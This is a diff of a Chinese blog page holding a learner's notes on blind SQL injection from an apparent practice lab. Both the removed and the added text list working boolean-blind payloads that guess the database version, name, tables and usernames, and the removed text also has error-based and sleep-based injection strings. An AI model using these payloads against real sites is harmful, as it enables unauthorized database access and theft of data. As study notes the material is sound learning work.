@@ -94,18 +94,18 @@
 
 
 
-<meta name="description" content="这次的与上次的sql注入有些许不同。上次的正常显示用户名和密码，这次不管怎么样都是同样的字符串，看来进行了if else判断。上次的我猜测大概是直接输出query结果，这次的看了源代码大概就是没有直接的输出…这…sql大法好rand()是产生随机数，floor()取整，count()计数,group by()分组 关于利用布尔得到我们想要的数据 第一步：and left(select versio">
+<meta name="description" content="1-4篇是基础知识。 从第五篇开始是盲注的有关知识。  上次的正常显示用户名和密码，这次不管怎么样都是同样的字符串，看来不是 直接输出 查询结果，而是利用 条件判断 来输出结果。  一些小知识  1234rand()：产生随机数floor()：取整count()：计数group by()：分组 开始实验五第一步 123?id=1&amp;apos; and left(select version(),1">
 <meta name="keywords" content="sql.fun">
 <meta property="og:type" content="article">
 <meta property="og:title" content="好玩的sql第五篇">
 <meta property="og:url" content="http://yoursite.com/2017/09/20/sql-5/index.html">
 <meta property="og:site_name" content="hhd">
-<meta property="og:description" content="这次的与上次的sql注入有些许不同。上次的正常显示用户名和密码，这次不管怎么样都是同样的字符串，看来进行了if else判断。上次的我猜测大概是直接输出query结果，这次的看了源代码大概就是没有直接的输出…这…sql大法好rand()是产生随机数，floor()取整，count()计数,group by()分组 关于利用布尔得到我们想要的数据 第一步：and left(select versio">
+<meta property="og:description" content="1-4篇是基础知识。 从第五篇开始是盲注的有关知识。  上次的正常显示用户名和密码，这次不管怎么样都是同样的字符串，看来不是 直接输出 查询结果，而是利用 条件判断 来输出结果。  一些小知识  1234rand()：产生随机数floor()：取整count()：计数group by()：分组 开始实验五第一步 123?id=1&amp;apos; and left(select version(),1">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2017-10-06T08:36:36.108Z">
+<meta property="og:updated_time" content="2017-10-15T06:48:12.459Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="好玩的sql第五篇">
-<meta name="twitter:description" content="这次的与上次的sql注入有些许不同。上次的正常显示用户名和密码，这次不管怎么样都是同样的字符串，看来进行了if else判断。上次的我猜测大概是直接输出query结果，这次的看了源代码大概就是没有直接的输出…这…sql大法好rand()是产生随机数，floor()取整，count()计数,group by()分组 关于利用布尔得到我们想要的数据 第一步：and left(select versio">
+<meta name="twitter:description" content="1-4篇是基础知识。 从第五篇开始是盲注的有关知识。  上次的正常显示用户名和密码，这次不管怎么样都是同样的字符串，看来不是 直接输出 查询结果，而是利用 条件判断 来输出结果。  一些小知识  1234rand()：产生随机数floor()：取整count()：计数group by()：分组 开始实验五第一步 123?id=1&amp;apos; and left(select version(),1">
 
 
 
@@ -339,17 +339,20 @@
       
 
       
-        <p>这次的与上次的sql注入有些许不同。<br>上次的正常显示用户名和密码，这次不管怎么样都是同样的字符串，看来进行了if else判断。<br>上次的我猜测大概是直接输出query结果，这次的看了源代码大概就是没有直接的输出…<br>这…sql大法好<br>rand()是产生随机数，floor()取整，count()计数,group by()分组</p>
-<p>关于利用布尔得到我们想要的数据</p>
-<p>第一步：and left(select version(),1)=4–+ 什么length(database())就不多说了，怎么说呢，没多大用啊…不是关键信息<br>若非正常显示表示错误，若正常显示，表示正确，通过页面返回情况判断是否正确</p>
-<p>第二步：猜解数据库名，手工注入真的是很慢的<br>left(database(),1)</p>
-<p>第三步：ascii(substr((select table_name information_schema.tables where tables_schema=database()limit 0,1),1,1))=*<br>ascii只是为了便捷 用left应该也是功能差不多</p>
-<p>第四步：select 1 from information_schema.columns where table_name=’users’ and table_name regexp ‘^us[a-z]’ limit 0,1 这个是判断是否包含，不怎么想看…</p>
-<p>第五步：ord(mid((select ifnull(cast(username as char),0x20)from security.users order by id LIMIT 0,1),1,1))=?? 这个是判断表中内容..算了算了先不看吧，记不住…</p>
-<p>接下来是错误反馈</p>
-<p>我就列一种错误，其实我也就稍微了解一种，其他的大哥我真的不懂<br>union select 1,count(<em>),concat((select user()),floor(rand(0)</em>2))a from information_schema.columns group by a–+<br>基于数值型的报错</p>
-<p>利用benchmark()和sleep()进行延时注入：?id=1’and If(ascii(substr(database(),1,1))=115,1,sleep(5))–+</p>
-<p>阿岳这个真的好麻烦…滚去玩…玩乐是最重要滴…</p>
+        <blockquote>
+<p>1-4篇是基础知识。 从第五篇开始是盲注的有关知识。</p>
+</blockquote>
+<p>上次的正常显示用户名和密码，这次不管怎么样都是同样的字符串，看来不是 <strong><em>直接输出</em></strong> 查询结果，而是利用 <strong><em>条件判断</em></strong> 来输出结果。</p>
+<blockquote>
+<p>一些小知识</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">rand()：产生随机数</div><div class="line">floor()：取整</div><div class="line">count()：计数</div><div class="line">group by()：分组</div></pre></td></tr></table></figure>
+<h2 id="开始实验五"><a href="#开始实验五" class="headerlink" title="开始实验五"></a>开始实验五</h2><p><strong><em>第一步</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">?id=1&apos; and left(select version(),1)=4--+ </div><div class="line">?id=1&apos; and length(database())=8--+</div><div class="line">?id=1&apos; and left(database(),1)=&apos;s&apos;--+</div></pre></td></tr></table></figure>
+<p>利用 <strong><em>left()</em></strong> 猜解版本、数据库长度、数据库名</p>
+<p><strong><em>第二步</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ascii(substr((select table_name information_schema.tables where tables_schema=database()limit 0,1),1,1))=&apos;*&apos;--+</div><div class="line"></div><div class="line">ord(mid((select ifnull(cast(username as char),0x20)from security.users order by id LIMIT 0,1),1,1))=??</div></pre></td></tr></table></figure>
+<p>limit 0,1是表示获取 <strong><em>第一个表</em></strong> ，获取 <strong><em>第二个表</em></strong> 是limit 1,1</p>
 
       
     </div>
@@ -380,8 +383,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/09/20/sql-3/" rel="next" title="好玩的sql第三篇">
-                <i class="fa fa-chevron-left"></i> 好玩的sql第三篇
+              <a href="/2017/09/19/sql-1/" rel="next" title="好玩的sql第一篇">
+                <i class="fa fa-chevron-left"></i> 好玩的sql第一篇
               </a>
             
           </div>
@@ -390,8 +393,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2017/09/20/sql-4/" rel="prev" title="好玩的sql第四篇">
-                好玩的sql第四篇 <i class="fa fa-chevron-right"></i>
+              <a href="/2017/09/20/sql-3/" rel="prev" title="好玩的sql第三篇">
+                好玩的sql第三篇 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -444,8 +447,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview sidebar-panel sidebar-panel-active">
+      <section class="site-overview sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
           <img class="site-author-image" itemprop="image"
                src="/images/avatar.gif"
@@ -462,7 +474,7 @@
             
               <a href="/archives">
             
-                <span class="site-state-item-count">23</span>
+                <span class="site-state-item-count">24</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -509,6 +521,22 @@
 
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#开始实验五"><span class="nav-number">1.</span> <span class="nav-text">开始实验五</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
